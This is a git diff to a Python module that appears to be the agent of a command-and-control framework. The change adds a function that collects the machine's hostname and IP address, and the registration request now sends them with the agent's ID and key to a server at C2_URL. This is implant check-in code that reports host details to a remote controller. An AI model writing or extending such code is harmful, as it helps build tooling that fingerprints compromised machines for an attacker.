@@ -5,6 +5,15 @@ import requests
 from config import CONFIG_PATH, C2_URL, REGISTER_ENDPOINT, LOGIN_ENDPOINT
 from jose import jwt, JWTError
 from datetime import datetime, timezone
+import socket
+
+def get_host_info():
+    hostname = socket.gethostname()
+    try:
+        ip = socket.gethostbyname(hostname)
+    except socket.gaierror:
+        ip = "127.0.0.1"
+    return hostname, ip
 
 def load_or_create_identity():
     print(f"[DEBUG] Writing identity to: {CONFIG_PATH}")
@@ -23,9 +32,13 @@ def load_or_create_identity():
 
 def register(agent_id: str, agent_key: str):
     url = f"{C2_URL}{REGISTER_ENDPOINT}"
+    hostname, ip = get_host_info()
+
     data = {
         "agent_id": agent_id,
-        "agent_key": agent_key
+        "agent_key": agent_key,
+        "netbios": hostname,
+        "ip": ip
     }
 
     try:
